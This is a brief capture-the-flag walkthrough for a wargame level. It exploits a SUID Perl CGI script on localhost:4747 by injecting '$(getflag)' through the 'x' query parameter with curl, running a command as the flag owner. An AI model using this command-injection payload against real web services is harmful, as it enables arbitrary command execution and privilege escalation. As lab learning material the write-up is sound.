# Level04
## Step by step
### 1. Locate the Perl script in `level04` home directory
  ```bash
  > ls -la
  -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
  ```
The `level04.pl` file is a Perl script with the **SUID** bit set, meaning it will execute with the privileges of its owner (`flag04`).

---

### 2. Understand the script functionality
The script is a CGI program that listens on `localhost:4747` and processes a query string parameter `x`. It executes the parameter as the owner of the file (`flag04`).

---

### 3. Exploit the script using `curl`
To exploit this behavior, send a request to `localhost:4747` with a query string `x` that executes the `getflag` command:

  ``` bash
  > curl http://localhost:4747/?x='$(getflag)'
  Check flag.Here is your token : XXX
  ```
